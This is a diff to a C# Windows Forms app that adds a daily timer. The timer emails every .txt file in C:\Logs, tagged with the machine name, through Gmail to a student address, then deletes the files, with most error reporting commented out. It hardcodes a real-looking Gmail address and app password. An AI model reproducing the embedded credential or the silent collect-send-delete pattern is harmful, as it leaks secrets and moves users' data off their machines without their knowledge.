@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
@@ -11,6 +11,9 @@ using MongoDB.Bson;
 using MongoDB.Driver;
 using System.Management;
 using Microsoft.Win32;
+using System.Net.Mail;
+using System.Net.NetworkInformation;
+using System.Net;
 
 namespace WindowsFormsApp2
 {
@@ -25,6 +28,7 @@ namespace WindowsFormsApp2
         private IMongoCollection<BsonDocument> fileCollection;
         private IMongoCollection<BsonDocument> detailFileCollection;
 
+        private Timer emailTimer; // Khai báo để gửi mail
 
         public Form1()
         {
@@ -53,6 +57,8 @@ namespace WindowsFormsApp2
                 detailFileCollection = database.GetCollection<BsonDocument>("detail_file");
 
                 LoadData();
+                
+                InitializeEmailTimer(); // Gửi email định kì
             }
             catch (Exception ex)
             {
@@ -416,7 +422,111 @@ namespace WindowsFormsApp2
             }
         }
 
+        private void InitializeEmailTimer()
+        {
+            emailTimer = new Timer();
+            emailTimer.Interval = 24 * 60 * 60 * 1000; // 24 hours in milliseconds
+            emailTimer.Tick += (s, e) => SendLogFilesByEmail();
+            emailTimer.Start();
 
+            // Optionally, send email immediately on startup (remove if not needed)
+            SendLogFilesByEmail();
+        }
+
+        private void SendLogFilesByEmail()
+        {
+            string folderPath = @"C:\Logs";
+            string senderEmail = "vocongkhanhhg2004@gmail.com";
+            string password = "vdzd darr eisw dzbo"; // App-specific password
+            string recipientEmail = "khanhb2203723@student.ctu.edu.vn";
+
+            if (CheckInternetConnection())
+            {
+                SendEmailWithAttachments(senderEmail, password, recipientEmail, folderPath);
+            }
+            else
+            {
+                Invoke(new Action(() => listBox1.Items.Insert(0, $"{DateTime.Now}: Không có kết nối mạng để gửi email")));
+            }
+        }
+
+        // Check internet connection
+        private bool CheckInternetConnection()
+        {
+            try
+            {
+                using (var ping = new Ping())
+                {
+                    PingReply reply = ping.Send("8.8.8.8", 2000);
+                    return reply.Status == IPStatus.Success;
+                }
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        // Send email with attachments
+        private void SendEmailWithAttachments(string sender, string password, string recipient, string folderPath)
+        {
+            try
+            {
+                MailMessage mail = new MailMessage();
+                SmtpClient smtpServer = new SmtpClient("smtp.gmail.com")
+                {
+                    Port = 587,
+                    Credentials = new NetworkCredential(sender, password),
+                    EnableSsl = true
+                };
+
+                mail.From = new MailAddress(sender);
+                mail.To.Add(recipient);
+                mail.Subject = "Log Files from " + Environment.MachineName;
+                mail.Body = "Đây là danh sách tệp log từ thư mục: " + folderPath;
+
+                // Get list of .txt files in the folder
+                string[] files = Directory.GetFiles(folderPath, "*.txt");
+                if (files.Length == 0)
+                {
+                    //Invoke(new Action(() => listBox1.Items.Insert(0, $"{DateTime.Now}: Không có file .txt để gửi")));
+                    return;
+                }
+
+                foreach (string file in files)
+                {
+                    mail.Attachments.Add(new Attachment(file));
+                }
+
+                smtpServer.Send(mail);
+                //Invoke(new Action(() => listBox1.Items.Insert(0, $"{DateTime.Now}: Email gửi thành công với {files.Length} file")));
+
+                // Dispose attachments and mail
+                foreach (Attachment attachment in mail.Attachments)
+                {
+                    attachment.Dispose();
+                }
+                mail.Dispose();
+
+                // Delete all sent .txt files
+                foreach (string file in files)
+                {
+                    try
+                    {
+                        File.Delete(file);
+                        //Invoke(new Action(() => listBox1.Items.Insert(0, $"{DateTime.Now}: Đã xóa file: {file}")));
+                    }
+                    catch (Exception ex)
+                    {
+                        //Invoke(new Action(() => listBox1.Items.Insert(0, $"{DateTime.Now}: Lỗi khi xóa file {file}: {ex.Message}")));
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                //Invoke(new Action(() => listBox1.Items.Insert(0, $"{DateTime.Now}: Lỗi khi gửi email: {ex.Message}")));
+            }
+        }
 
 
         private void btnLoadData_Click_1(object sender, EventArgs e)
